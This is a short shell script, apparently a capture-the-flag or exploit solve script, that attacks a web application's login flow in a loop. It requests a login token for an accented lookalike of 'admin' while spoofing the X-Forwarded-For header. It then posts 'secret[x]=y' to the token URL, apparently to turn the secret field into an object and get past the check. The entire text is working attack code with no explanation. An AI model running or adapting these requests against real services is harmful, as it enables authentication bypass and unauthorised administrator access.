for i in `seq 1 10`; do
  KEY=$(curl $APP_HOST/login --data 'name=adm%C3%8Cn' -H 'X-Forwarded-For: 0.0.0.0' -s | jq -r .login_token_key)

  curl "$APP_HOST/login/$KEY" --data 'secret[x]=y'
  echo
done;